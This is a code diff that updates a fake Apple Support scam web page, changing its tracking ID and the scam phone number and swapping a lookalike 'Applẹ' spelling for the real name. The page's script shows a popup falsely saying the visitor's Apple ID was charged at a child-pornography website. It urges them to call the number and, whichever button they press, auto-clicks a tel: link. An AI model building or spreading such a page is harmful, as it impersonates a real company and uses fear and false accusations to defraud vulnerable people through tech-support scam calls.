@@ -13,14 +13,15 @@
     <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF%2bPro%2cv1_7CSF%2bPro%2bIcons%2cv1html.html" />
     <script src="text_tel.js"></script>
  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-0LY0HY7L01');
+  gtag('config', 'G-2DMKRPGVF0');
 </script>
+
 </head>
 
 <body>
@@ -133,7 +134,7 @@
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                       <a href="#">Applẹ Support +1-866-354-4048 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+                       <a href="#">Apple Support +1-888-449-3954 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
 					 </span>
                     <div class="ac-ln-menu">
                         <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
@@ -181,7 +182,7 @@
                     </div>
                     <div class="as-banner-content">
                         <div class="pageTitle  ">
-                            <h1 class="pageTitle-heading">Applẹ Support </h1>
+                            <h1 class="pageTitle-heading">Apple Support </h1>
                             <p class="pageTitle-intro js_setTextBlock" />
                         </div>
                         <div class="sectionTitle sectionTitleBlock">
@@ -203,7 +204,7 @@
 					States </a>
                 </div>
                 <div class="ac-gf-footer-legal">
-                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Applẹ . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
                     <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
 					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
                         <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
@@ -211,7 +212,7 @@
 						Apple </a></div>
                 </div>
                 <meta content="Apple" property="name" />
-                <meta content="+1-866-354-4048
+                <meta content="+1-888-449-3954
 			 " property="telephone" />
             </section>
         </div>
@@ -278,7 +279,7 @@
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1-866-354-4048');
+        window.number = (window.number ? window.number : '+1-888-449-3954');
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -336,7 +337,7 @@
         }, 100);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-354-4048"></a>');
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-449-3954"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
@@ -353,7 +354,7 @@
         };
 
         function myFunction() {
-            if (confirm("Your Applẹ ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $549.70 Via Applẹ Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Applẹ Support +1-866-354-4048 to Freeze it!.")) {
+            if (confirm("Your Apple ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-888-449-3954 to Freeze it!.")) {
                 okkkk();
             } else {
                 okkkk();
